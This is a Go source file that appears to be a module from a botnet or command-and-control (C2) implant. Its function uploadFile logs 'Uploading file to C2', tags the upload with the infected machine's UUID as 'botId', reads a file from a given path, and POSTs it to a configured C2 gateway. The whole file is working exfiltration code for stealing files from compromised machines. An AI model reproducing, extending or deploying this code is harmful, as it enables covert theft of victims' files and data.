package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
)

type UploadFileParams struct {
	Path string `json:"path"`
}

func uploadFile(params UploadFileParams) error {

	fmt.Println("[UPLOAD] - Uploading file to C2...")
	fmt.Printf("[UPLOAD] - File path : %s\n", params.Path)

	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	var buf bytes.Buffer

	// Create a new multipart writer with the buffer
	w := multipart.NewWriter(&buf)

	_ = w.WriteField("botId", uuid)
	_ = w.WriteField("uploadType", "audio")

	// Add a file to the request
	file, err := os.Open(params.Path)

	if err != nil {
		log.Fatal(err)
		return err
	}

	// Create a new form field
	fw, err := w.CreateFormFile("file", params.Path)
	if err != nil {
		log.Fatal(err)
		return err
	}

	// Copy the contents of the file to the form field
	if _, err := io.Copy(fw, file); err != nil {
		log.Fatal(err)
		return err
	}

	// Close the multipart writer to finalize the request
	w.Close()

	// Send the request
	req, err := http.NewRequest("POST", url, &buf)
	if err != nil {
		log.Fatal(err)
		return err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
		return err
	}
	defer resp.Body.Close()
	file.Close()

	return nil
}
